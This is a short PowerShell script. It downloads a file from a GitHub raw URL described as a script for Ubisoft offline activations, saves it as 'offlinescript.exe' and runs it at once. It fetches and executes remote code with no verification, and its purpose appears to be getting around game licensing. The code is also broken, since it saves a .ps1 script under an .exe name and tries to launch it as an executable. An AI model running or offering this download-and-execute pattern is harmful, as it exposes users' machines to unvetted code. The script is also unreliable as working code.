# Define the URL of the executable file
$url = "https://raw.githubusercontent.com/darrenphilip/Script-For-Ubisoft-Offline-Activations/main/script.ps1"

# Define the local output path for the downloaded executable
$output = "offlinescript.exe"

# Download the executable file
Invoke-WebRequest -Uri $url -OutFile $output

# Run the downloaded executable
Start-Process -FilePath $output -NoNewWindow
